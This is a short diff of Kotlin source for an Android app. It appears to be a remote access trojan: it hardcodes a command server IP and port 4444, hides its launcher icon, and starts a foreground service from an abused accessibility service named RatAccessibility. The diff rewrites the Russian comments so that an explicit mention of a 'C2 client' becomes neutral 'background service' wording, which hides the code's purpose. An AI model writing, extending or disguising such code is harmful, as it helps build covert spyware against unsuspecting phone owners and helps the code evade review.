@@ -25,8 +25,8 @@ import java.util.concurrent.LinkedBlockingQueue
 val SERVER_IP = "178.155.5.234"
 val SERVER_PORT = 4444
 
-// Класс MainActivity больше не нужен, так как мы убрали иконку с экрана.
-// Оставим его пустым на всякий случай, чтобы не было ошибок компиляции.
+// Точка входа (её не будет на экране, так как нет activity в манифесте, 
+// но класс нужен для сборки)
 class MainActivity : android.app.Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -98,7 +98,7 @@ class RatAccessibility : AccessibilityService() {
             notificationTimeout = 100
         }
         serviceInfo = info
-        // Запускаем C2-клиент сразу, как только включили доступность
+        // Запускаем фоновую службу, когда включен тумблер
         startForegroundService(Intent(this, RatForeground::class.java))
     }
 
